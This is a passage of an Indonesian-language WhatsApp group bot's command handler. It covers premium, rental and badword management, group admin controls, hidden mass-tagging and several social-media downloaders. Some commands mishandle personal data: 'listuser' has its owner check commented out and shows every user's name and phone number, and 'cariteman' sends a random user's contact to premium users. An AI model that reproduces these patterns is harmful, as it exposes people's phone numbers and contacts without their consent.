				fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
				xdev.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: dev})
				break
				
				
				
				case 'adderror':
				case 'emror':
				{
				if (!q) return setReply(`Yang error apa bro ?\nContoh: ${prefix}adderror nosinya|menu`)
				if (!dev.key.fromMe && !isOwner) return reply (mess.only.ownerB)
				oke = q.split("|")[0]
				oka = q.split("|")[1]
				addError(oke, oka, listerror)
				await setReply(`Sukses Menambahkan ${q} ke daftar error`)
				}
				break
				
				
			      
           
      case 'addbadword':
                if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
                if (args.length < 1) return setReply(`masukkan kata`)
                if (isKasar(q, badword)) return setReply(`Udah ada`)
                addBadword(q, badword)
                setReply(`Sukses`)
                break
            case 'delbadword':
                 if (!isGroupAdmins && !isOwner) return setReply('hanya admin dan owner') 
                if (args.length < 1) return setReply(`masukkan kata`)
                if (!isKasar(q, badword)) return setReply(`Ga ada`)
                delBadword(q, badword)
                setReply(`Sukses`)
                break
            case 'clearbadword':
                if (!isOwner) return onlyOwner() 
                if (args.length < 1) return setReply(`tag atau nomor`)
                if (mentioned.length !== 0){
                    for (let i = 0; i < mentioned.length; i++){
                    delCountKasar(mentioned[i], senbadword)
                    }
                    setReply('Sukses')
                } else {
                    delCountKasar(args[1] + '@s.whatsapp.net', senbadword)
                    setReply('Sukses')
                }
                break




    

    

case 'antichatbot':
                if (!isOwner) return onlyOwner()
                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
                  if(chatBot === true) return setReply("Udah aktif")
                    chatBot = true
					setReply(`Sukses mengaktifkan Antichatbot\nuntuk mengganti teks chatbot ketik ${prefix}tekschat <teks>`)
                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                   if(chatBot === false) return setReply("Sudah mati")
                    chatBot = false
					setReply(`Berhasil mematikan Antichatbot`)
                } else if (!q) {
                      sendButMessage(from, `MODE ANTI CHAT BOT`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antichatbot on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antichatbot off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                





case 'explain':
                if (!isOwner) return onlyOwner()
                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
                  if(explain) return setReply("Udah aktif")
                    explain = true
					setReply(`Sukses mengaktifkan explain silakan cek dengan ketik ${prefix}menu`)
                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                   if(!explain) return setReply("Sudah mati")
                    explain = false
					setReply(`Berhasil mematikan explain`)
                } else if (!q) {
                      sendButMessage(from, `MODE EXPLANATION`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}explain on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}explain off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;





case 'anticall':
                if (!isOwner) return onlyOwner()
                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
                  if(Anticall === true) return setReply("Udah aktif")
                    Anticall = true
					setReply(`Sukses mengaktifkan Anticall`)
                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                   if(Anticall === false) return setReply("Sudah mati")
                    Anticall = false
					setReply(`Berhasil mematikan Anticall`)
                } else if (!q) {
                      sendButMessage(from, `MODE ANTI CALL`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}anticall on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}anticall off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
   


              
                 
    

	
	case 'addsewa':
	           {
		      if (!isOwner) return onlyOwner()
              if (!isGroup)return setReply(mess.only.group)
              if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
              if (args.length < 1) return setReply(`Penggunaan :\n*${prefix}addsewa waktu`)       
             if(_sewa.checkSewaGroup(from, sewa)) return setReply("Grup tersebut masih tersisa waktu sewa")
             linkgc = await xdev.groupInviteCode(from)
             yeh = `https://chat.whatsapp.com/${linkgc}`          
            _sewa.addSewaGroup(from, groupName, yeh, q, sewa)
             await setReply(`Success`)
              }
              break
              
              case 'delsewa':
              {
              if (!isOwner) return onlyOwner()
              if (!isGroup)return setReply(mess.only.group)
              sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
              fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa))
              setReply(mess.success)
              }
              break
              
              
              
              
              
       case 'sewalist': 
       case 'listsewa':
              let txtnyee = `*List Sewa*\nJumlah : ${sewa.length}\n\n`
              for (let i of sewa){
              let cekvipp = ms(i.expired - Date.now())
              txtnyee += `Group : ${i.group}\nID : ${i.id}\nExpire : ${cekvipp.days} hari ${cekvipp.hours} jam ${cekvipp.minutes} menit ${cekvipp.seconds} detik\n\n`             
               } 
               txtnyee += `© ${fake1}`
              setReply(txtnyee)
              break
              
              
       case 'orderlist': 
       case 'listorder':
              if (!isOwner) return onlyOwner()
              let ordernye = `*List Order*\nJumlah : ${sewa.length}\n\n`
              for (let i of sewa){
              let cekvipp = ms(i.expired - Date.now())
              ordernye += `Group : ${i.group}\nID : ${i.id}\nExpired : ${cekvipp.days} hari ${cekvipp.hours} jam ${cekvipp.minutes} menit ${cekvipp.seconds} detik\nLink : ${i.linkgc}\n\n`             
               } 
               ordernye += `© ${fake1}`
              setReply(ordernye)
              break
              
            case 'listuser':
			case 'userlist':
		//     if (!isOwner) return onlyOwner()
	         let usernye = `*List User*\nJumlah : ${user.length}\n\n`
			user.map(function(e, i){
			
            usernye += (i+1)+`.Nama : ${e.name}\n    Nomer : wa.me/${e.id}\n\n`            
        });
				setReply(usernye)
				break
				
case 'dashboard':
case 'listused':
 nene = `*List Used Command*\nTotal : ${Dashboard.length}\n\n`
Dashboard.map(function(e, i){
nene += (i+1)+`. ${e.name}: ${e.count}\n`            
 });
 
nenen = [{"buttonId": `${prefix}clearalldb`,"buttonText": {"displayText": `ᴄʟᴇᴀʀ`},"type": "RESPONSE"},
                    {"buttonId": `DEVELOPER`,"buttonText": {"displayText": `ᴅᴇᴠᴇʟᴏᴘᴇʀ`},"type": "RESPONSE"}]
sendButLocation(from, nene, `© ${fake1}`, fs.readFileSync('./stik/bot.jpg'), nenen, {contextInfo: forward})             
break
              
             
         
    
              
      case 'listerror': 
      case 'errorlist':
      case 'daftarerror':
              let errornye = `*List Error*\nJumlah : ${JSON.parse(fs.readFileSync('./database/listerror.json')).length}\n\n`
              for (let i of JSON.parse(fs.readFileSync('./database/listerror.json'))){          
              errornye += `Command : ${i.cmd}\n${i.error}\n\n`             
               } 
               errornye += `© ${fake1}`
              setReply(errornye)
              break


	
	case 'premium':
	case 'prem':
	case 'addprem':
	       if (!isOwner) return onlyOwner()
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}addprem Tag/Reply/input nomer\n\nPilih waktu\ns = detik\nh = jam\nd =hari\n\nContoh: ${prefix}addprem +62xxx 1h`)       
if (args[0].startsWith('08')) return setReply('Awali nomor dengan 62')  
if(args.length > 2 ) return setReply(`Format salah, ketik ${prefix}addprem 62851xxx 1h Gitu tod`)
if(args.length < 2 ) return setReply(`Format salah, ketik ${prefix}addprem 62851xxx 1h Gitu tod`)
nomor = args[0] + `@s.whatsapp.net`              
if(_prem.checkPremiumUser (nomor, premium)) return setReply("User tersebut sudah di premium kak")   
_prem.addPremiumUser (nomor, args[1], premium)         
await setReply(`Succes add premium ${nomor}`)
await sendButMessage(nomor, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
    
} else if (dev.message.extendedTextMessage.contextInfo.participant) {
premnih = dev.message.extendedTextMessage.contextInfo.participant
if (!isGroup) return setReply("Hanya bisa di group")
if(args.length < 1) return setReply(`Penggunaan :\n${prefix}addprem\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)      
 if(_prem.checkPremiumUser (premnih, premium)) return setReply("User tersebut sudah di premium kak")   
_prem.addPremiumUser (premnih, q, premium)         
 await setReply(`Succes add premium ${premnih.split("@")[0]}`)
await sendButMessage(premnih, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
    
 } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`Satu satu dong`)
if(args.length < 2) return setReply(`Penggunaan :\n${prefix}addprem\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)       
lulu =`${mentioned[0].split('@')[0]}@s.whatsapp.net`
 if(_prem.checkPremiumUser (lulu, premium)) return setReply("User tersebut sudah di premium kak")   
_prem.addPremiumUser (lulu, args[1], premium)         
await setReply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
await sendButMessage(lulu, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
   } else{
 setReply(`Kirim perintah ${prefix}addprem @tag atau nomor atau reply pesan orang yang ingin di addprem`)
 }
break    
	
	
	
  
         
case 'delprem':
case 'delpremium':
       if (!isOwner) return onlyOwner()
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return setReply("Penggunaan : delprem Tag/Reply/Input nomer target yang mau di jadikan premium")
if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
if(args[3]) return setReply(`Format salah, ketik ${prefix}delprem 62851xxx  Gitu tod`)
nomor = args[0] + `@s.whatsapp.net` 
if(!_prem.checkPremiumUser (nomor, premium)) return setReply("Maap kak user tersebut tidak ada di database")   
          _prem.delPremiumUser (nomor, premium)
          return setReply(`Succes delete premium ${nomor}`)
          
 } else if (dev.message.extendedTextMessage.contextInfo.participant) {
if (!isGroup) return setReply("Hanya bisa di group")
premnih = dev.message.extendedTextMessage.contextInfo.participant
if(args.length > 0) return setReply("Format salah")
if(!_prem.checkPremiumUser (premnih, premium)) return setReply("Maap kak user tersebut tidak ada di database")   
 _prem.delPremiumUser (premnih, premium) 
  await setReply(`Succes delete premium  ${premnih.split("@")[0]}`)
  
} else if(dev.message.extendedTextMessage.contextInfo.mentionedJid) { 
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if(mentioned.length > 1) return setReply("Satu satu kak")
	lulu = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
	if(!_prem.checkPremiumUser (lulu, premium)) return setReply("Maap kak user tersebut tidak ada di database")   
_prem.delPremiumUser (lulu, premium) 
await setReply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
 }
break    
	
          
          
                 


 
                  
                  
         
	
	
	
	
	
	case 'addstatus':
	case 'addstory':
					if (!isOwner && !dev.key.fromMe) return onlyOwner()
					if (args.length < 1) return setReply('Teksnya?')
					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
							await xdev.sendMessage('status@broadcast', buff, image, {caption: `${q}`})
						await setReply(`Sukses mengirim up status image ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
							await xdev.sendMessage('status@broadcast', buff, video, {caption: `${q}`})
						setReply(`Sukses mengirim up status video ${q}`)
						} else {
							await xdev.sendMessage('status@broadcast', `*${q}`,text)
						await sendMess(`Sukses mengirim status:\n${q}`)
					}
					break
					
	
	
//-------------------------------》FITUR PREMIUM《-------------------------------\\       
	
	
case 'cariteman':
case 'caridoi':
if (!isPremium && !isOwner && !dev.key.fromMe) return setReply(`Kamu bukan user premium`)
	//const namanya = xdev.contacts[teman] != undefined ? xdev.contacts[teman].vname || xdev.contacts[teman].notify : undefined
	          
 teman = user[Math.floor(Math.random() * user.length)]
 namaTeman = teman.name
 nomerTeman = teman.id
	setTimeout( () => {
                    setReply("Sedang mencari....")
                    },1000)  
	setTimeout( () => {
                    setReply("Berhasil mendapatkan satu doi")
                    },5000)  
    setTimeout( () => {           
    sendKontak(from, `${nomerTeman}`, namaTeman, "Sibuk");
                    },9000)  
    break
	
	
	
	
	
	
	case 'chat':
	if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
           if (args.length < 1) return setReply(`Penggunaan ${prefix}chat 62xnxx|teks`)
			if (args[0].startsWith('08')) return setReply('Awali nomor dengan 62') 
            var nomor = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") 
            var org = q.split("|")[1];
            xdev.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            setReply(`Sukses mengirim chat:\n${org} ke nomer ${nomor}`)
            break
	
	
//-----------------------------------] Menu Download [-----------------------------------//
	
/*
    otakudesu,
	covid,
	ongoing,
	komiku,✓
	tebakgambar,
	surah,
	sholat,
	lirik,
	chara,✓
	wattpad,
	playstore,✓
	linkwa,✓
	pinterest,✓
	igdl,✓
	igstory,✓
	igstalk,✓
	twitter,✓
	fbdown,✓
	youtube,
	ttdownloader✓
         -ttaudio
         -ttwm✓
         -ttnowm✓
*/

case 'igstalk':
try{
if (!q) return setReply('Usernamenya?')
ig.fetchUser(`${q}`).then(Y => {
console.log(Y)
ten = `${Y.hd_profile_pic_url_info.url}`
teks = `*ID* : ${Y.id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.fullname}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.followers}\n*Following* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
sendMediaURL(from,ten,teks) 
})} catch (err){
console.log(err)
setReply("Aduh error om")
}
break;      




case 'twmp4': case 'twitter':
if (args.length < 1) return setReply('Link?')
lin = args[0]
setReply(mess.wait)
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
sendFileFromUrl(Anu, video, {quoted: dev, caption: 'Done!'})
})
break


case 'twmp4hd':
case 'twitterhd':
  if (!isPremium && !isOwner && !dev.key.fromMe) return setReply(`Kamu bukan user premium`)
if (args.length < 1) return setReply('Link?')
lin = args[0]
setReply(mess.wait)
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.HD
fotonya = res.thumb
//fto =  await getBuffer(fotonya)
//xdev.sendMessage(from, fto, image, {quoted:dev, caption:`*TWITTER MP4*\n\n•> Hd : ${res.HD}\n•> Sd : ${res.SD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail: fto, contextInfo:forward})
sendFileFromUrl(Anu, video, {quoted: dev, caption: 'Done!'})
})
break





          


case 'pinterest':
try{
if (!isPremium && !isOwner) return setReply(mess.only.prem)
if(!q) return setReply('gambar apa?')
setReply(mess.wait)
let pin = await hx.pinterest(q)
let ac = pin[Math.floor(Math.random() * pin.length)]
let di = await getBuffer(ac)
await xdev.sendMessage(from,di,image,{quoted: dev})
 } catch (err){
console.log(err)
return setReply("Yah ga ketemu, coba lagi dong ^_^ ")
}
break
	
	
case 'wallpaper':
wallpaperv2(q).then(async (data) => {
console.log(data)
foto = data[Math.floor(Math.random() * data.length)]
 await sendFileFromUrl(foto, image, {quoted: dev, caption: "Nih"})
})
break
	
case 'gimage':
case 'googleimage':
case 'image':
if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 1) return setReply('Apa Yang Mau Dicari?')
try{
googleImage(q).then(async (data) => {
//console.log(data)
foto = data[Math.floor(Math.random() * data.length)]
if(data.length == "0") return setReply("Image tidak di temukan")
setReply(mess.wait)
await sendFileFromUrl(foto, image, {quoted: dev, caption: "Nih"})
})
} catch(err){
teks = args.join(' ')
res = await gis(teks, google)
function google(error, result){
if (error){ return setReply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: dev, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
}
limitAdd(senderNumber, user)
break


case 'igstory': 
if(!q) return setReply('Usernamenya?')      
Download.insta_story(q).then(async (data) => {
console.log(data)
for(let i of data.stories){
if(i.type == 'photo'){
await sendFileFromUrl(i.url, image, {quoted: dev, caption: "Nih"})
} else if(i.type == 'video'){
await sendFileFromUrl(i.url, video, {quoted: dev, caption: "Nih"})
 }
 }
})
break
           

	
	case 'linkwa':{
            if(!q) return setReply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '*「 _LINK WA_ 」*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            setReply(res)
            });
            }
            break
  
            
            
            
            
            
            
            
            
            
            case 'tiktok':        
                     if (args.length < 1) return setReply('Link?')
                     if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("Error link")
                     if(q.startsWith("https://vt.tiktok.com/")){
                     var lin = args[0]
                     } else if(q.startsWith("https://vm.tiktok.com/")){
                     var lin = args[0]
                     } else if(q.startsWith("https://www.tiktok.com/")){
                     var lin = args[0]
                     } else {
                     return setReply("Masukan link tikok, contoh https://vt.tiktok.com/")
                     }
                     setReply(mess.wait)
                     hx.ttdownloader(lin).then(res => {
                     console.log('[ T I K T O K ] downloader')
                     ep = res.wm                     
                     sendFileFromUrl(ep, video, {quoted: dev, caption: "Nih"})
                      })
                      break
                      
                               
                     case 'tiktoknowm':     
                     try{   
                     if (args.length < 1) return setReply('Link?')
                     if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply(aml.Iv)
                     if(q.startsWith("https://vt.tiktok.com/")){
                     var lin = args[0]
                     } else if(q.startsWith("https://vm.tiktok.com/")){
                     var lin = args[0]
                     } else if(q.startsWith("https://www.tiktok.com/")){
                     var lin = args[0]
                     } else {
                     return setReply("Masukan link tikok, contoh https://vt.tiktok.com/")
                     }
                     setReply(mess.wait)
                     hx.ttdownloader(lin).then(res => {
                     console.log('[ T I K T O K ] downloader')
                     ep = res.nowm                     
                     sendFileFromUrl(ep, video, {quoted: dev, caption: "Nih"})
                      })
                      } catch (err){
                      	setReply(`${err}`)
                      }
                      break
                      
                      
	
case 'ig':
setReply(mess.wait)
if (!q) return setReply('Linknya?')
igreel = q.includes("https://www.instagram.com/reel/")

if(igreel){
Download.insta_reel(q).then(async (data) => {
sendFileFromUrl(`${data.url}`, video, {quoted: dev, caption: `Nih`})
console.log(data)
console.log(data.url)
})
} else {
var { igDownloader } = require('./lib/igdown')
res = await igDownloader(`${q}`).catch(e => {
return setReply(mess.error.api)
})
console.log(res)
sendMediaURL (from, res.result.link, res.result.desc) 
}
break
                   
                   

   
  

        
	
    
	                                                                                    
            
    case 'totag':
    if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
            if (!dev.key.fromMe && !isOwner && !isGroupAdmins) return setReply(mess.only.admin)
            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !dev.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !dev.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          setReply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
	
	
	case 'hidetag':
	if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
  if(isExtream) return
			if (!dev.key.fromMe & !isGroupAdmins) return setReply(mess.only.admin)
			if (!isGroup) return setReply(mess.only.group)
			var value = args.join(' ')
			var group = await xdev.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: dev
			}
			xdev.sendMessage(from, optionshidetag, text)
			break
	
	
  //-------------------------------》FITUR GROUP《-------------------------------\\       
    
    
case 'simi':              
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (!isGroup) return setReply('hanya bisa di group')
if (isSimi) return setReply('Fitur sudah aktif kak')
siminya.push(from);
let ih =`Fitur simi telah di aktifkan di group ini, ketik silakan ketik ${prefix}halo`
xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isGroup) return setReply('hanya bisa di group')
if (!isSimi) return setReply('Udah mati')
siminya.splice(from, 1);
let ih =`Fitur simi telah di matikan`
xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
}else if (!q) {
sendButMessage(from, `MODE SIMI SIMI`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}simi on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}simi off`, buttonText: { displayText: Off },type: 1}]);
} else {  
if(isSimi) return   
simi = await fetchJson(`https://api.simsimi.net/v2/?text=${q}&lc=id`)
sami = simi.success
setReply(sami) 
}
break
             
             
    
    
case 'linkgc':
case 'linkgroup':
if (!isGroup) return
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
linkgc = await xdev.groupInviteCode(from)
yeh = `*「 Link Group 」*\n•> Group Whatsapp :\nhttps://chat.whatsapp.com/${linkgc}\n\n_yo bisa yo ramein_`
xdev.sendMessage(from, yeh, text, { quoted: dev })
break

case 'gc':
case 'group':
if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
 if (!q) {
               sendButMessage(from, `GRUP SETTING`, `Silahkan pilih salah satu`, [
                 {buttonId: `${prefix}group open`, buttonText: {displayText: `OPEN`,},type: 1},
                 {buttonId: `${prefix}group close`, buttonText: {displayText: `CLOSE`,},type: 1},
                  {buttonId: `${prefix}revoke`, buttonText: { displayText: `REVOKE`,},type: 1}]);
                    }
if (args[0] === 'open') {

await  xdev.groupSettingChange(from, GroupSettingChange.messageSend, false)
await setReply('_Success_')
} else if (args[0] === 'close') {
 await xdev.groupSettingChange(from, GroupSettingChange.messageSend, true)
await setReply('_Success_')
}
                 break;


case 'setdesc':
case 'setdesk':
if (!isGroupAdmins) return sendSticker(hanyaadmin)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if(!q) return setReply("Teksnya apa")
xdev.groupUpdateDescription(from, q)
setReply("Succes")
break

case 'setnamegc':
{
if(!q) return setReply("masukin teksnya kak")
if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
await xdev.groupUpdateSubject(from, `${args.join(" ")}`)
await xdev.sendMessage(from, 'Succes change name group', text, {quoted:dev})
}
break





	case 'unadmin':
	case 'demote':
	if (!isGroupAdmins && !isOwner) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}promote Tag/Reply/input nomer`)       
if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
nomor = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
xdev.groupDemoteAdmin(from, [nomor])
teks = `Members @${nomor.split('@')[0]} succes demote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[nomor]}})

} else if (dev.message.extendedTextMessage.contextInfo.participant) {
premnih = dev.message.extendedTextMessage.contextInfo.participant
if (!isGroup) return setReply("Hanya bisa di group")
xdev.groupDemoteAdmin(from, [premnih])
teks = `Members @${premnih.split('@')[0]} succes demote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[premnih]}})

 } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`Satu satu dong`)
lulu =`${mentioned[0].split('@')[0]}@s.whatsapp.net`
xdev.groupDemoteAdmin(from, [lulu])
teks = `Members @${lulu.split('@')[0]} succes demote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[lulu]}})
   } else{
 setReply(`Kirim perintah ${prefix}promote tag atau input nomor atau reply pesan orang yang ingin di promote`)
 }
break    










case 'admin':
	case 'promote':
	if (!isGroupAdmins && !isOwner) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}promote Tag/Reply/input nomer`)       
if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
nomor = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
xdev.groupMakeAdmin(from, [nomor])
teks = `Members @${nomor.split('@')[0]} succes promote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[nomor]}})

} else if (dev.message.extendedTextMessage.contextInfo.participant) {
premnih = dev.message.extendedTextMessage.contextInfo.participant
if (!isGroup) return setReply("Hanya bisa di group")
xdev.groupMakeAdmin(from, [premnih])
teks = `Members @${premnih.split('@')[0]} succes promote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[premnih]}})

 } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`Satu satu dong`)
lulu =`${mentioned[0].split('@')[0]}@s.whatsapp.net`
xdev.groupMakeAdmin(from, [lulu])
teks = `Members @${lulu.split('@')[0]} succes promote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[lulu]}})
   } else{
 setReply(`Kirim perintah ${prefix}promote tag atau input nomor atau reply pesan orang yang ingin di promote`)
 }
break    
	






case 'revoke':
if (!isGroupAdmins) return sendSticker(hanyaadmin)
